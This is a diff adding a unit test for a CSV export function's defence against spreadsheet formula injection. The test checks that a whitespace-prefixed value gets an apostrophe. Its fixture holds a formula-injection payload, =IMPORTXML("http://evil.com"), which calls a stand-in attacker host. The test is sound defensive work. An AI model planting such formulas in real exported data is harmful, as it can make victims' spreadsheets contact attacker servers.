@@ -370,4 +370,13 @@ describe('observationsToCsv', () => {
     // Category field starting with '=' should be prefixed with apostrophe
     expect(csv).toContain("'=SUM");
   });
+
+  it('prefixes whitespace-prefixed formula-injection characters with apostrophe', () => {
+    const obs = makeObservation({
+      tags: { category: ' =IMPORTXML("http://evil.com")' },
+    });
+    const csv = observationsToCsv([obs]);
+    // Category field starting with whitespace then '=' should still be prefixed
+    expect(csv).toContain("' =IMPORTXML");
+  });
 });
